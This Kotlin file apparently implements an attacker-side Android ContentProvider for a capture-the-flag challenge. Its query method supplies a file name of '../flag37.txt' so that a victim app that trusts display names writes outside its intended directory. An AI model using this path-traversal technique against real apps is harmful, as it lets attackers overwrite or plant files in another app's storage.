package io.ks.intentatk

import android.content.ContentProvider
import android.content.ContentValues
import android.database.Cursor
import android.database.MatrixCursor
import android.net.Uri
import android.os.ParcelFileDescriptor
import android.provider.OpenableColumns
import android.util.Log
import java.io.FileNotFoundException
import java.io.IOException

class AtkIntent37Provider : ContentProvider() {

    override fun delete(uri: Uri, selection: String?, selectionArgs: Array<String>?): Int {
        TODO("Implement this to handle requests to delete one or more rows")
    }

    override fun getType(uri: Uri): String {
        Log.i("AttackProvider", "getType($uri)")
        return "text/html"
    }

    override fun insert(uri: Uri, values: ContentValues?): Uri? {
        TODO("Implement this to handle requests to insert a new row.")
    }

    override fun onCreate(): Boolean {
       return true
    }

    override fun query(
        uri: Uri, projection: Array<String>?, selection: String?,
        selectionArgs: Array<String>?, sortOrder: String?,
    ): Cursor {
        val cursor = MatrixCursor(arrayOf(OpenableColumns.DISPLAY_NAME, OpenableColumns.SIZE))
        cursor.addRow(arrayOf("../flag37.txt", 1337))
        return cursor
    }

    override fun openFile(uri: Uri, mode: String): ParcelFileDescriptor {
        Log.i("AttackProvider", "openFile($uri)")
        try {
            val pipe = ParcelFileDescriptor.createPipe()
            val outputStream = ParcelFileDescriptor.AutoCloseOutputStream(pipe[1])

            Thread {
                try {
                    outputStream.write("give flag".toByteArray())
                    outputStream.close()
                } catch (e: IOException) {
                    Log.e("AttackProvider", "Error in pipeToParcelFileDescriptor", e)
                }
            }.start()

            return pipe[0]
        } catch (e: IOException) {
            throw FileNotFoundException("Could not open pipe for: $uri")
        }
    }


    override fun update(
        uri: Uri, values: ContentValues?, selection: String?,
        selectionArgs: Array<String>?,
    ): Int {
        TODO("Implement this to handle requests to update one or more rows.")
    }
}